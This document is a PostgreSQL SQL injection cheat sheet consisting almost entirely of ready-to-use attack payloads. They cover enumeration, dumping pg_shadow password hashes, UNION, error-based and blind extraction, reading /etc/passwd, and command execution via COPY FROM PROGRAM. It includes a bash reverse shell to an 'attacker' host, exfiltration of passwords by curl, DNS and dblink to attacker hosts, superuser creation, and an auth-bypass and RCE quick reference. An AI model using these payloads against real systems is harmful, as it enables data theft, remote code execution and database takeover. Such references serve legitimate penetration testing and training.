# PostgreSQL SQL Injection

## Version Detection

```sql
SELECT version()
```

## Information Gathering

### Current Context

| Query                       | Description      |
| --------------------------- | ---------------- |
| `SELECT user`               | Current user     |
| `SELECT current_user`       | Current user     |
| `SELECT session_user`       | Session user     |
| `SELECT current_database()` | Current database |
| `SELECT current_schema()`   | Current schema   |
| `SELECT inet_server_addr()` | Server IP        |
| `SELECT inet_server_port()` | Server port      |

### Database Enumeration

```sql
-- List databases
SELECT datname FROM pg_database

-- List schemas
SELECT schema_name FROM information_schema.schemata

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- List columns
SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'

-- List all tables with schema
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')
```

### User Information

```sql
-- List users
SELECT usename FROM pg_user
SELECT rolname FROM pg_roles

-- User details
SELECT usename,usecreatedb,usesuper FROM pg_user

-- Password hashes
SELECT usename,passwd FROM pg_shadow

-- Superusers
SELECT usename FROM pg_user WHERE usesuper IS TRUE

-- Current privileges
SELECT * FROM pg_user WHERE usename=current_user
```

## String Functions

| Function    | Example                  | Result |
| ----------- | ------------------------ | ------ |
| Concat      | `'a'\|\|'b'`             | `ab`   |
| `CONCAT`    | `CONCAT('a','b')`        | `ab`   |
| `SUBSTRING` | `SUBSTRING('hello',1,3)` | `hel`  |
| `SUBSTR`    | `SUBSTR('hello',1,3)`    | `hel`  |
| `LEFT`      | `LEFT('hello',2)`        | `he`   |
| `RIGHT`     | `RIGHT('hello',2)`       | `lo`   |
| `LENGTH`    | `LENGTH('hello')`        | `5`    |
| `ASCII`     | `ASCII('A')`             | `65`   |
| `CHR`       | `CHR(65)`                | `A`    |

### String Aggregation (Concatenating Multiple Rows)

**⚠️ Important:** `CONCAT()` only accepts **scalar values**, NOT subqueries that return multiple rows!

#### ❌ WRONG - This will fail:

```sql
SELECT CONCAT((SELECT table_name FROM information_schema.tables))
-- Error: more than one row returned by a subquery used as an expression
```

#### ✅ CORRECT - Use string_agg() or array functions:

```sql
-- Method 1: string_agg() - Recommended (PostgreSQL 9.0+)
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'

-- Method 2: array_to_string() + array()
SELECT array_to_string(array(SELECT table_name FROM information_schema.tables WHERE table_schema='public'), ',')

-- Method 3: Using || with GROUP BY (less common)
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users'

-- In UNION context:
' UNION SELECT 1,string_agg(table_name,','),3,4 FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT 1,array_to_string(array(SELECT table_name FROM information_schema.tables),','),3,4--
```

#### Common Use Cases:

```sql
-- List all databases
SELECT string_agg(datname, ',') FROM pg_database

-- List all tables
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'

-- List all columns from a table
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users'

-- Extract data from multiple rows
SELECT string_agg(username || ':' || password, '|') FROM users

-- With ordering
SELECT string_agg(table_name, ',' ORDER BY table_name) FROM information_schema.tables WHERE table_schema='public'
```

## Comment Syntax

```sql
-- Single line
SELECT 1--comment
SELECT 1/*comment*/

-- Inline
SEL/**/ECT 1
```

## Stacked Queries

PostgreSQL supports stacked queries:

```sql
SELECT 1; SELECT 2
'; SELECT version()--
```

## Conditional Statements

```sql
-- CASE
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END

-- COALESCE
SELECT COALESCE(NULL,'default')

-- NULLIF
SELECT NULLIF(1,1)  -- Returns NULL if equal
```

## Time Delays

```sql
-- pg_sleep
SELECT pg_sleep(5)
'; SELECT pg_sleep(5)--

-- Conditional
SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END

-- GENERATE_SERIES (CPU intensive)
SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)
```

## Error-based Extraction

```sql
-- CAST to numeric
SELECT CAST(version() AS numeric)
SELECT CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS numeric)

-- With concatenation
SELECT CAST(CHR(126)||version()||CHR(126) AS numeric)
SELECT CAST(CHR(126)||(SELECT password FROM users LIMIT 1)||CHR(126) AS numeric)
```

## UNION Attacks

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT version(),NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

## Blind Extraction

```sql
-- Boolean
' AND SUBSTRING(current_database(),1,1)='p'--
' AND ASCII(SUBSTRING(current_database(),1,1))>96--

-- Time-based
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## File Operations

### Read Files

```sql
-- COPY command (requires superuser)
CREATE TABLE mydata(t text);
COPY mydata FROM '/etc/passwd';
SELECT * FROM mydata;
DROP TABLE mydata;

-- pg_read_file (requires superuser)
SELECT pg_read_file('/etc/passwd',0,1000);

-- pg_read_binary_file
SELECT pg_read_binary_file('/etc/passwd');

-- lo_import (large objects)
SELECT lo_import('/etc/passwd',12345);
SELECT * FROM pg_largeobject WHERE loid=12345;
```

### Write Files

```sql
-- COPY command
COPY (SELECT 'data') TO '/tmp/output.txt';

-- Write table data
COPY users TO '/tmp/users.txt';

-- Large objects
SELECT lo_from_bytea(12346,'data');
SELECT lo_export(12346,'/tmp/output.txt');
```

## OS Command Execution

### COPY TO PROGRAM (PostgreSQL 9.3+)

```sql
-- Execute command
CREATE TABLE myoutput(output text);
COPY myoutput FROM PROGRAM 'id';
SELECT * FROM myoutput;

-- Reverse shell
COPY myoutput FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
```

### Libc System (PostgreSQL < 8.2)

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
AS '/lib/x86_64-linux-gnu/libc.so.6','system'
LANGUAGE 'c' STRICT;

SELECT system('whoami');
```

### Custom Library (PostgreSQL 9+)

Requires uploading compiled library with `PG_MODULE_MAGIC`:

```sql
CREATE FUNCTION sys(cstring) RETURNS int
AS '/tmp/pg_exec.so','pg_exec'
LANGUAGE 'c' STRICT;

SELECT sys('whoami');
```

### Upload Library via Large Objects

```sql
-- Split and upload library in chunks
SELECT lo_create(1337);
INSERT INTO pg_largeobject (loid,pageno,data) VALUES (1337,0,decode('base64_chunk1','base64'));
INSERT INTO pg_largeobject (loid,pageno,data) VALUES (1337,1,decode('base64_chunk2','base64'));
-- Continue for all chunks

-- Export to file
SELECT lo_export(1337,'/tmp/pg_exec.so');

-- Create function
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so','pg_exec' LANGUAGE 'c' STRICT;
```

## Out-of-Band

### COPY TO PROGRAM + curl

```sql
COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://attacker/?data=$(cat)';
```

### DNS via COPY

```sql
COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.attacker.com';
```

### dblink Extension

```sql
-- If dblink installed
SELECT * FROM dblink('host=attacker.com user=x password='||(SELECT password FROM users LIMIT 1)||' dbname=x','SELECT 1') RETURNS (i int);
```

## Extensions

```sql
-- List loaded extensions
SELECT * FROM pg_extension;

-- Common useful extensions
-- dblink: remote database connections
-- pg_stat_statements: query logging
-- plpython3u: Python execution
```

## Privilege Escalation

```sql
-- Create superuser
CREATE USER attacker WITH SUPERUSER PASSWORD 'password';

-- Alter existing user
ALTER USER username WITH SUPERUSER;

-- Grant role
GRANT pg_execute_server_program TO username;  -- 11+
```

## Quick Payload Reference

```sql
-- Auth bypass
' OR '1'='1'--
' OR 1=1--

-- Union
' UNION SELECT NULL--
' UNION SELECT version(),NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Error
' AND CAST(version() AS numeric)--
' AND CAST((SELECT password FROM users LIMIT 1) AS numeric)--

-- Stacked
'; SELECT version()--
'; CREATE TABLE x(t text); COPY x FROM PROGRAM 'id'--

-- Time-based
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- File read
'; CREATE TABLE x(t text); COPY x FROM '/etc/passwd'; SELECT * FROM x--

-- RCE
'; COPY x FROM PROGRAM 'id'--
```

## Detection Hints

```
Error patterns:
- "ERROR: syntax error at or near"
- "ERROR: invalid input syntax"
- "unterminated quoted string"

Application hints:
- Ruby on Rails often uses PostgreSQL
- Python Django common with PostgreSQL
```
